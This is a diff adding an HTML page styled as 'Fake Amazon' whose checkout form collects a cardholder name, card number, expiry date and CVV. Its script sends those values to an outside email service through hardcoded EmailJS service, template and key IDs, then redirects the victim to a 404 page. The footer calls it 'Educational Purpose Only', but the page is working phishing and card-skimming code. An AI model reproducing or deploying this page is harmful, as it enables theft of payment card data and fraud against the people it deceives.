@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Amazon</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+        header {
+            background-color: #232f3e;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .product {
+            border: 1px solid #ddd;
+            background: white;
+            margin: 15px;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        .products-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .product img {
+            max-width: 100%;
+            border-radius: 5px;
+        }
+        .product button {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #ff9900;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            padding: 10px;
+            background-color: #232f3e;
+            color: white;
+        }
+        form {
+            max-width: 400px;
+            margin: 20px auto;
+            padding: 15px;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        form input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff9900;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your Public Key
+        })();
+
+        function showPaymentForm(product) {
+            document.getElementById("productName").value = product;
+            document.getElementById("paymentForm").style.display = "block";
+        }
+
+        function sendEmail(event) {
+            event.preventDefault(); // Prevent form submission
+
+            const paymentForm = document.getElementById("paymentForm");
+
+            emailjs.sendForm("service_c9j5ckg", "template_j9e3qug", paymentForm, "bXVOCsqcoj6pBUFZg")
+                .then(function () {
+                    alert("Payment details sent successfully.");
+                    paymentForm.reset(); // Reset the form after submission
+                    paymentForm.style.display = "none";  // Hide the payment form again
+                    
+                    // Simulate a site shutdown by redirecting to a non-existent URL (404 error page)
+                    window.location.href = '/404.html';  // This will simulate a "shutdown"
+                }, function (error) {
+                    alert("Failed to send payment details: " + JSON.stringify(error));
+                });
+        }
+    </script>
+</head>
+<body>
+    <header>
+        <h1>Fake Amazon</h1>
+    </header>
+
+    <div class="products-container">
+        <div class="product">
+            <img src="https://via.placeholder.com/200" alt="Product 1">
+            <h2>Product 1</h2>
+            <p>Price: $100</p>
+            <button onclick="showPaymentForm('Product 1')">Buy Now</button>
+        </div>
+        <div class="product">
+            <img src="https://via.placeholder.com/200" alt="Product 2">
+            <h2>Product 2</h2>
+            <p>Price: $200</p>
+            <button onclick="showPaymentForm('Product 2')">Buy Now</button>
+        </div>
+    </div>
+
+    <form id="paymentForm" style="display: none;" onsubmit="sendEmail(event)">
+        <h2>Payment Information</h2>
+        <input type="hidden" id="productName" name="product_name" value="">
+        <input type="text" name="name" placeholder="Name on Card" required>
+        <input type="text" name="card_number" placeholder="Card Number" required>
+        <input type="text" name="expiry_date" placeholder="Expiry Date (MM/YY)" required>
+        <input type="text" name="cvv" placeholder="CVV" required>
+        <button type="submit">Submit Payment</button>
+    </form>
+
+    <footer>
+        <p>&copy; 2025 Fake Amazon (Educational Purpose Only)</p>
+    </footer>
+
+</body>
+</html>
+
